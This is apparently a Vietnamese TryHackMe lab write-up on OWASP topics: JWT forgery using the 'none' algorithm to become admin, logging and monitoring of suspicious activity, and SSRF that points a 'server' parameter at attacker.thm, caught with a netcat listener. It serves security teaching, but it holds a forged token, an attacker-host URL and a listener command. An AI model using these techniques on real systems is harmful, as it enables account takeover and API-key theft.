- ***Cách hoạt động***: 

    - Server tạo ***JWT*** với ***Signature*** dựa trên ***Header***, ***Payload*** và một ***khóa bí mật***.

    - Nếu kẻ tấn công thay đổi ***Payload***, ***Signature*** sẽ không khớp, và server sẽ từ chối token.

***Lưu ý*** , ***signature*** chứa dữ liệu nhị phân, vì vậy ngay cả khi giải mã, cũng không hiểu được.

***JWT and the None Algorithm***

- Một số thư viện JWT cho phép sử dụng thuật toán ***none***, nghĩa là không cần ***Signature***.

- Kẻ tấn công có thể: 

    - Đổi thuật toán trong ***Header*** thành ***none***.

    - Xóa ***Signature***.

    - Thay đổi ***Payload*** (ví dụ: đổi username thành "admin").

- Kết quả: Token giả mạo được chấp nhận mà không cần khóa bí mật.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image48.png?raw=true)

Thử truy cập http://10.10.115.163:8089/

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image49.png?raw=true)

account guest: ***guest / guest***

Sau khi login với tư cách guest, phát hiện jwt được lưu trong cookie với ***name=jwt-session***.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image50.png?raw=true)

Thử giải mã token: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image51.png?raw=true)

=> 

    {"typ":"JWT","alg":"HS256"}.
    {"username":"guest","exp":1736271311}.

Sửa thành: 

    {"typ":"JWT","alg":"none"}.
    {"username":"admin","exp":1736271311}.

Mã hóa lại, tương đương với jwt: 

    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM2MjcxMzExfQ==.

Sửa cookie ***jwt-session** và refresh web: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image52.png?raw=true)

***9.Security Logging and Monitoring Failures***

=> Tại sao ***Logging*** (Ghi nhật ký) quan trọng?

- ***Logging*** là quá trình ghi lại mọi hành động của người dùng trên ứng dụng web.

- ***Mục đích***: Khi xảy ra sự cố hoặc tấn công, nhật ký giúp theo dõi hoạt động của kẻ tấn công, xác định rủi ro và giảm thiểu thiệt hại.

- ***Nếu không có Logging***: Không thể biết được kẻ tấn công đã làm gì, dẫn đến hậu quả nghiêm trọng.

***Thông tin cần ghi trong Logs:***

- ***Mã trạng thái HTTP*** (HTTP status code).

- ***Thời gian*** (Time Stamps).

- ***Tên người dùng*** (Usernames).

- ***Đường dẫn API / trang web*** (API endpoints / page locations).

- ***Địa chỉ IP*** (IP addresses).

=> Cách lưu trữ Logs an toàn:

- Logs chứa thông tin nhạy cảm, nên cần được lưu trữ an toàn và có nhiều bản sao ở các vị trí khác nhau để tránh mất mát.

=> Giám sát hoạt động đáng ngờ:

- ***Mục đích***: Phát hiện sớm các hoạt động bất thường để ngăn chặn kẻ tấn công hoặc giảm thiểu thiệt hại.

Ví dụ về hoạt động đáng ngờ:

- ***Nhiều lần thử đăng nhập thất bại*** hoặc truy cập trái phép vào tài nguyên (ví dụ: trang admin).

- ***Requests từ địa chỉ IP hoặc vị trí bất thường.***

- ***Sử dụng công cụ tự động***: Có thể phát hiện qua giá trị ***User-Agent*** hoặc tốc độ request.

- ***Sử dụng payload phổ biến***: Kẻ tấn công thường dùng các payload đã biết để thử nghiệm.

=> Đánh giá và phản hồi:

- ***Phát hiện hoạt động đáng ngờ là chưa đủ***: Cần đánh giá mức độ tác động của từng hành động.

- ***Hành động có tác động cao*** (ví dụ: truy cập trái phép vào dữ liệu nhạy cảm) cần được ưu tiên xử lý ngay lập tức và gửi cảnh báo đến các bên liên quan.

Ví dụ 1 file log: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image53.png?raw=true)

=> IP đáng ngờ : ***49.99.13.16***

=> Đang cố brute force login form!

***10.Server-Side Request Forgery***

***Server-Side Request Forgery (SSRF) là gì?***

- ***SSRF*** là lỗ hổng cho phép kẻ tấn công ép buộc ứng dụng web gửi các yêu cầu (request) đến các đích tùy ý mà họ kiểm soát.

- Lỗ hổng này thường xảy ra khi ứng dụng web cần tương tác với các dịch vụ bên ngoài (ví dụ: API của bên thứ ba).

=> Ví dụ về SSRF:

- Giả sử một ứng dụng web gửi tin nhắn SMS thông qua API của nhà cung cấp dịch vụ SMS.

- Ứng dụng này yêu cầu một ***khóa API*** để xác thực và tính phí cho mỗi tin nhắn.

- ***Lỗ hổng***: Ứng dụng cho phép người dùng chỉ định địa chỉ server của nhà cung cấp SMS thông qua tham số ***server***.

- Kẻ tấn công có thể thay đổi giá trị ***server*** thành địa chỉ của họ, khiến ứng dụng gửi yêu cầu đến server của họ thay vì nhà cung cấp SMS.

- Kết quả: Kẻ tấn công có thể đánh cắp khóa API và sử dụng dịch vụ SMS miễn phí.

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image54.png?raw=true)

=> Cách kẻ tấn công khai thác:

- Thay đổi tham số ***server***:

    - Ví dụ: https://www.mysite.com/sms?server=attacker.thm&msg=ABC

    - Ứng dụng sẽ gửi yêu cầu đến https://attacker.thm/api/send?msg=ABC.

- Bắt nội dung yêu cầu:

    - Kẻ tấn công sử dụng công cụ như ***NetCat*** để bắt và xem nội dung yêu cầu.

        user@attackbox$ nc -lvp 80
        Listening on 0.0.0.0 80
        Connection received on 10.10.1.236 43830
        GET /:8087/public-docs/123.pdf HTTP/1.1
        Host: 10.10.10.11
        User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
        Accept: */*
    
=> Hậu quả của SSRF:

- ***Liệt kê mạng nội bộ***:
    
    - Kẻ tấn công có thể khám phá các IP và port trong mạng nội bộ của ứng dụng.

- ***Lạm dụng mối quan hệ tin cậy:***

    - Kẻ tấn công có thể truy cập các dịch vụ bị hạn chế bằng cách lợi dụng sự tin cậy giữa các server.

- ***Thực thi mã từ xa (RCE):***

    - Kẻ tấn công có thể tương tác với các dịch vụ không phải HTTP để thực thi mã độc.

Truy cập http://10.10.115.163:8087/

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image55.png?raw=true)

Thử truy cập endpoint ***/admin***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image56.png?raw=true)

=> Host duy nhất được truy cập admin area là ***localhost***

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image57.png?raw=true)

=> Tham số server mà nút ***Download Resume*** trỏ tới là ***server=secure-file-storage.com***

Sử dụng ***Netcat*** tạo server lắng nghe: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image58.png?raw=true)















    










































































